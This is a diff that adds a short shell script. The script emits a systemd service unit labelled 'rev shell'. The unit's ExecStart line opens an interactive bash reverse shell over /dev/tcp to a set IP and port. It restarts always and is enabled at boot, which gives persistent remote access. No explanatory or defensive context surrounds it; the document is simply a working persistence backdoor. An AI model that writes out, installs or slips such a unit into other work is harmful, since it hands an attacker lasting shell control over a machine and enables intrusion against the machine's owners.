@@ -1,0 +1,15 @@
+IP=192.168.168.222
+PORT=65001
+cat <<EOF 
+[Unit]
+Description=rev shell
+[Service]
+# User=root
+# Group=root
+# WorkingDirectory=/root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${IP}/${PORT} 0>&1'
+Restart=always
+RestartSec=50
+[Install]
+WantedBy=multi-user.target
+EOF
